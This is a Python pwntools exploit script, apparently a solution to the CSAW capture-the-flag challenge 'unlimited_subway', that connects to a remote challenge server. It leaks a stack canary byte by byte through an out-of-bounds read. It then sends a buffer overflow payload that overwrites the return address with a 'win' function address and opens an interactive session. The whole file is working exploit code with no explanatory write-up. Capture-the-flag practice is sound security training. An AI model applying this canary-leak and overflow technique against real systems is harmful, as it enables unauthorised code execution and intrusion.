#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template unlimited_subway
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('unlimited_subway')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
win = 0x08049304

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

def leak(index):
    io.sendlineafter(b'> ',b'V')
    io.sendlineafter(b': ',str(index).encode())
    return io.recvline().split(b' : ')[1][:-1]
#io = start()
io = remote('pwn.csaw.io' ,7900)
canary = bytearray(b'abcd')
for i in range(4):
    print(leak(128+i))
    canary[i]=int(leak(128+i),16)
print(hex(u32(canary)))
payload = 64*b'A'+p32(u32(canary))+b'A'*4+p32(win)
io.sendline(b'E')
io.sendline(str(256).encode())
io.sendline(payload)

io.interactive()

